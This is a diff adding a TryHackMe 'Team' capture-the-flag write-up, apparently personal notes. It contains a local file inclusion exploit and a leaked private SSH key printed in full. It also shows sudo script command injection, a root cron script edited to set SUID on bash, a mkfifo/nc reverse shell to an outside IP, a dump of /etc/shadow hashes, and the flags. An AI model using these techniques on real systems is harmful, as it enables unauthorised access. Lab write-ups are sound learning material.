@@ -373,3 +373,378 @@ http://dev.team.thm/script.php?page=php://filter/read=convert.base64-encode/reso
 ┌──(kali㉿kali)-[~]
 └─$ echo 'Cjw/cGhwICAgCiRmaWxlID0gJF9HRVRbJ3BhZ2UnXTsKICAgaWYoaXNzZXQoJGZpbGUpKQogICB7CiAgICAgICBpbmNsdWRlKCIkZmlsZSIpOwogICB9CiAgIGVsc2UKICAgewogICAgICAgaW5jbHVkZSgidGVhbXNoYXJlLnBocCIpOwogICB9Cj8+Cg==' | base64 -d
 
+<?php   
+$file = $_GET['page'];
+   if(isset($file))
+   {
+       include("$file");
+   }
+   else
+   {
+       include("teamshare.php");
+   }
+?>
+
+http://dev.team.thm/script.php?page=../../../../home/dale/.ssh/id_rsa (empty)
+http://dev.team.thm/script.php?page=/../../../../../../../root/root.txt (same)
+http://dev.team.thm/script.php?page=/../../../../../../../home/dale/user.txt
+THM{6Y0TXHz7c2d} 
+
+Using burp suite professional (sniper)
+
+like this
+
+GET /script.php?page=/../../../../../../../§etc/passwd§ HTTP/1.1
+
+and in payloads choose .. /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
+
+then start attack 
+
+length 167 is empty (wow in 10 seconds finish it with burp professional! )
+
+filter expression by id_rsa
+
+/etc/ssh/sshd_config (find this let's check)
+
+view-source:http://dev.team.thm/script.php?page=/../../../../../../../etc/ssh/sshd_config
+
+find id_rsa
+
+#Dale id_rsa
+#-----BEGIN OPENSSH PRIVATE KEY-----
+#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+#NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
+#NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
+#oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
+#o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
+#zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
+#k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS
+#xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S
+#0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2
+#EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU
+#eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v
+#7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v
+#JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/
+#FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l
+#gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4
+#xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH
+#ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb
+#esUW5UVqzUwbReU99WUjsG7V50VRqFUolh2hV1FvnHiLL7fQer5QAvGR0+QxkGLy/AjkHO
+#eXC1jA4JuR2S/Ay47kUXjHMr+C0Sc/WTY47YQghUlPLHoXKWHLq/PB2tenkWN0p0fRb85R
+#N1ftjJc+sMAWkJfwH+QqeBvHLp23YqJeCORxcNj3VG/4lnjrXRiyImRhUiBvRWek4o4Rxg
+#Q4MUvHDPxc2OKWaIIBbjTbErxACPU3fJSy4MfJ69dwpvePtieFsFQEoJopkEMn1Gkf1Hyi
+#U2lCuU7CZtIIjKLh90AT5eMVAntnGlK4H5UO1Vz9Z27ZsOy1Rt5svnhU6X6Pldn6iPgGBW
+#/vS5rOqadSFUnoBrE+Cnul2cyLWyKnV+FQHD6YnAU2SXa8dDDlp204qGAJZrOKukXGIdiz
+#82aDTaCV/RkdZ2YCb53IWyRw27EniWdO6NvMXG8pZQKwUI2B7wljdgm3ZB6fYNFUv5AAAA
+#wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q
+#z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6
+#RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7
+#/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx
+#sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb
+#mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur
+#4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg
+#e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S
+#2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH
+#8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX
+#b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7
+#CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
+#-----END OPENSSH PRIVATE KEY-----
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ nano id_rsa
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ sed 's/#//' id_rsa > id_rsa
+```
+```text
+┌──(kali㉿kali)-[~/team]
+└─$ nano uncomment
+```
+```text
+┌──(kali㉿kali)-[~/team]
+└─$ sed 's/#//' uncomment > id_rsa
+```
+```text
+┌──(kali㉿kali)-[~/team]
+└─$ cat id_rsa 
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
+NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
+oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
+o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
+zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
+k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS
+xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S
+0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2
+EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU
+eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v
+7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v
+JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/
+FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l
+gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4
+xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH
+ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb
+esUW5UVqzUwbReU99WUjsG7V50VRqFUolh2hV1FvnHiLL7fQer5QAvGR0+QxkGLy/AjkHO
+eXC1jA4JuR2S/Ay47kUXjHMr+C0Sc/WTY47YQghUlPLHoXKWHLq/PB2tenkWN0p0fRb85R
+N1ftjJc+sMAWkJfwH+QqeBvHLp23YqJeCORxcNj3VG/4lnjrXRiyImRhUiBvRWek4o4Rxg
+Q4MUvHDPxc2OKWaIIBbjTbErxACPU3fJSy4MfJ69dwpvePtieFsFQEoJopkEMn1Gkf1Hyi
+U2lCuU7CZtIIjKLh90AT5eMVAntnGlK4H5UO1Vz9Z27ZsOy1Rt5svnhU6X6Pldn6iPgGBW
+/vS5rOqadSFUnoBrE+Cnul2cyLWyKnV+FQHD6YnAU2SXa8dDDlp204qGAJZrOKukXGIdiz
+82aDTaCV/RkdZ2YCb53IWyRw27EniWdO6NvMXG8pZQKwUI2B7wljdgm3ZB6fYNFUv5AAAA
+wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q
+z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6
+RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7
+/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx
+sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb
+mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur
+4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg
+e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S
+2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH
+8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX
+b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7
+CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
+-----END OPENSSH PRIVATE KEY-----
+```
+```text
+┌──(kali㉿kali)-[~/team]
+└─$ chmod 600 id_rsa
+```
+```text
+┌──(kali㉿kali)-[~/team]
+└─$ ssh -i id_rsa dale@10.10.167.117
+Last login: Mon Jan 18 10:51:32 2021
+dale@TEAM:~$ whoami
+dale
+```
+```text
+┌──(kali㉿kali)-[~/team]
+└─$ ssh -i id_rsa dale@10.10.167.117
+Last login: Mon Jan 18 10:51:32 2021
+dale@TEAM:~$ whoami
+dale
+dale@TEAM:~$ ls
+user.txt
+dale@TEAM:~$ pwd
+/home/dale
+dale@TEAM:~$ cat user.txt 
+THM{6Y0TXHz7c2d}
+
+dale@TEAM:~$ sudo -l
+Matching Defaults entries for dale on TEAM:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dale may run the following commands on TEAM:
+    (gyles) NOPASSWD: /home/gyles/admin_checks
+dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
+Reading stats.
+Reading stats..
+Enter name of person backing up the data: gyles
+Enter 'date' to timestamp the file: 1/1/1
+The Date is Stats have been backed up
+
+dale@TEAM:~$ cat /home/gyles/admin_checks
+#!/bin/bash
+
+printf "Reading stats.\n"
+sleep 1
+printf "Reading stats..\n"
+sleep 1
+read -p "Enter name of person backing up the data: " name
+echo $name  >> /var/stats/stats.txt
+read -p "Enter 'date' to timestamp the file: " error
+printf "The Date is "
+$error 2>/dev/null
+
+date_save=$(date "+%F-%H-%M")
+cp /var/stats/stats.txt /var/stats/stats-$date_save.bak
+
+printf "Stats have been backed up\n"
+
+El script hace lo siguiente:
+
+1.  Muestra un mensaje de "Leyendo estadísticas." y espera 1 segundo.
+2.  Muestra un mensaje de "Leyendo estadísticas.." y espera 1 segundo.
+3.  Pide al usuario que ingrese el nombre de la persona que está respaldando los datos y almacena la entrada en una variable llamada "name".
+4.  Agrega la variable "name" al archivo /var/stats/stats.txt.
+5.  Pide al usuario que ingrese la palabra "fecha" para timbrar el archivo.
+6.  Muestra un mensaje que dice "La fecha es" y luego ejecuta el comando "error" y redirige el error a /dev/null (que es un archivo especial que se utiliza para descartar la salida).
+7.  Almacena la fecha actual en una variable llamada "date_save" en el formato "AAAA-MM-DD-HH-MM".
+8.  Hace una copia de seguridad del archivo /var/stats/stats.txt en un archivo llamado /var/stats/stats-AAAA-MM-DD-HH-MM.bak utilizando la variable "date_save".
+9.  Muestra un mensaje que dice "Las estadísticas han sido respaldadas".
+
+dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
+Reading stats.
+Reading stats..
+Enter name of person backing up the data: /bin/bash
+Enter 'date' to timestamp the file: /bin/bash
+The Date is whoami
+gyles
+which python3
+/usr/bin/python3
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+gyles@TEAM:~$ whoami
+gyles
+
+privesc
+
+gyles@TEAM:~$ sudo -l
+[sudo] password for gyles: 
+Sorry, try again.
+[sudo] password for gyles: 
+Sorry, try again.
+[sudo] password for gyles: 
+sudo: 3 incorrect password attempts
+
+gyles@TEAM:/home/gyles$ cd /
+gyles@TEAM:/$ ls
+bin   home            lib64       opt   sbin  tmp      vmlinuz.old
+boot  initrd.img      lost+found  proc  snap  usr
+dev   initrd.img.old  media       root  srv   var
+etc   lib             mnt         run   sys   vmlinuz
+gyles@TEAM:/$ cd opt
+gyles@TEAM:/opt$ ls
+admin_stuff
+gyles@TEAM:/opt$ cd admin_stuff/
+gyles@TEAM:/opt/admin_stuff$ ls
+script.sh
+gyles@TEAM:/opt/admin_stuff$ cat script.sh 
+#!/bin/bash
+#I have set a cronjob to run this script every minute
+
+dev_site="/usr/local/sbin/dev_backup.sh"
+main_site="/usr/local/bin/main_backup.sh"
+#Back ups the sites locally
+$main_site
+$dev_site
+
+gyles@TEAM:/$ cd usr/local/
+gyles@TEAM:/usr/local$ ls -lah
+total 40K
+drwxr-xr-x 10 root root  4.0K Jan 15  2021 .
+drwxr-xr-x 10 root root  4.0K Jan 15  2021 ..
+drwxrwxr-x  2 root admin 4.0K Jan 17  2021 bin
+drwxr-xr-x  2 root root  4.0K Apr 26  2018 etc
+drwxr-xr-x  2 root root  4.0K Apr 26  2018 games
+drwxr-xr-x  2 root root  4.0K Apr 26  2018 include
+drwxr-xr-x  3 root root  4.0K Jan 15  2021 lib
+lrwxrwxrwx  1 root root     9 Jan 15  2021 man -> share/man
+drwxr-xr-x  2 root root  4.0K Jan 17  2021 sbin
+drwxr-xr-x  4 root root  4.0K Jan 15  2021 share
+drwxr-xr-x  2 root root  4.0K Apr 26  2018 src
+
+I have full r/w permsissions so anything in put in the script will be executed as root. in /bin
+
+gyles@TEAM:/usr/local$ cd bin
+gyles@TEAM:/usr/local/bin$ ls
+main_backup.sh
+gyles@TEAM:/usr/local/bin$ ls -lah
+total 12K
+drwxrwxr-x  2 root admin 4.0K Jan 17  2021 .
+drwxr-xr-x 10 root root  4.0K Jan 15  2021 ..
+-rwxrwxr-x  1 root admin   65 Jan 17  2021 main_backup.sh
+gyles@TEAM:/usr/local/bin$ echo "chmod +s /bin/bash" >> main_backup.sh
+gyles@TEAM:/usr/local/bin$ /bin/bash -p
+bash-4.4# whoami
+root
+bash-4.4# exit
+exit
+gyles@TEAM:/usr/local/bin$ /bin/bash
+bash-4.4$ whoami
+gyles
+bash-4.4$ cd /root
+bash: cd: /root: Permission denied
+bash-4.4$ exit
+exit
+gyles@TEAM:/usr/local/bin$ cat main_backup.sh 
+#!/bin/bash
+cp -r /var/www/team.thm/* /var/backups/www/team.thm/
+chmod +s /bin/bash
+
+gyles@TEAM:/usr/local/bin$ /bin/bash -p
+bash-4.4# cat /root/root.txt
+THM{fhqbznavfonq}
+
+another way
+
+gyles@TEAM:/usr/local/bin$ nano main_backup.sh 
+Unable to create directory /home/dale/.local/share/nano/: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+gyles@TEAM:/usr/local/bin$ cat main_backup.sh 
+#!/bin/bash
+cp -r /var/www/team.thm/* /var/backups/www/team.thm/
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f
+```
+```text
+┌──(kali㉿kali)-[~/team]
+└─$ rlwrap nc -lnvp 1337                                  
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.167.117.
+Ncat: Connection from 10.10.167.117:38536.
+bash: cannot set terminal process group (2550): Inappropriate ioctl for device
+bash: no job control in this shell
+root@TEAM:~# whoami;cat /root/root.txt;cat /etc/shadow
+whoami;cat /root/root.txt;cat /etc/shadow
+root
+THM{fhqbznavfonq}
+root:$6$xuuJwXec$qc1o9t6ZiJgSSp37ODrG4WBnE8schSnQ/IHiWvLNo/w42X2U9WkMR689AXYkN.wwM83yTDRQ3rCtTlz1mN9rm0:18644:0:99999:7:::
+daemon:*:17647:0:99999:7:::
+bin:*:17647:0:99999:7:::
+sys:*:17647:0:99999:7:::
+sync:*:17647:0:99999:7:::
+games:*:17647:0:99999:7:::
+man:*:17647:0:99999:7:::
+lp:*:17647:0:99999:7:::
+mail:*:17647:0:99999:7:::
+news:*:17647:0:99999:7:::
+uucp:*:17647:0:99999:7:::
+proxy:*:17647:0:99999:7:::
+www-data:*:17647:0:99999:7:::
+backup:*:17647:0:99999:7:::
+list:*:17647:0:99999:7:::
+irc:*:17647:0:99999:7:::
+gnats:*:17647:0:99999:7:::
+nobody:*:17647:0:99999:7:::
+systemd-network:*:17647:0:99999:7:::
+systemd-resolve:*:17647:0:99999:7:::
+syslog:*:17647:0:99999:7:::
+messagebus:*:17647:0:99999:7:::
+_apt:*:17647:0:99999:7:::
+lxd:*:18642:0:99999:7:::
+uuidd:*:18642:0:99999:7:::
+dnsmasq:*:18642:0:99999:7:::
+landscape:*:18642:0:99999:7:::
+pollinate:*:18642:0:99999:7:::
+dale:$6$OD7sttk0$u3wdqLBRI6wyHQg610OgQvG/kga9w4xx90YQ4lVYZsQ4txK3qfBnhGL2N5DOFPA7qfMQuLZpB.dpNL7beqAtk0:18644:0:99999:7:::
+gyles:$6$fEb0A7IP$U/eT3u7lo3OiDr/ssF.VxtSYb/n.vaqUjehRP.R7XqvsTSYW5YFIgL8G8UPO.YxVsSUVAXAgwe86p4PqxBoGR.:18644:0:99999:7:::
+ftpuser:$6$4uqJHENY$pGEGsZOmkquSGZdvHe7lZibsSCoXSvJ6wZ.LhJiFRA.R4Jy1FfbG5nBK/Y41uT/XyPL3T36XigwMquL8XB90r.:18642:0:99999:7:::
+ftp:*:18642:0:99999:7:::
+sshd:*:18642:0:99999:7:::
+
+:)
+```
+![[Pasted image 20221222232514.png]]
+![[Pasted image 20221222235959.png]]
+![[Pasted image 20221223002308.png]]
+![[Pasted image 20221223002513.png]]
+![[Pasted image 20221223003101.png]]
+user.txt
+As the "dev" site is under contruction maybe it has some flaws? "url?=" + "This rooms picture"
+root.txt
+Is root running anything automated? ps I like PATH s
+
+## Flags / Answers
+- ***THM{6Y0TXHz7c2d}***
+- ***THM{fhqbznavfonq}***
+
+## Notes / Lessons Learned
+[[Ra 2]]
+
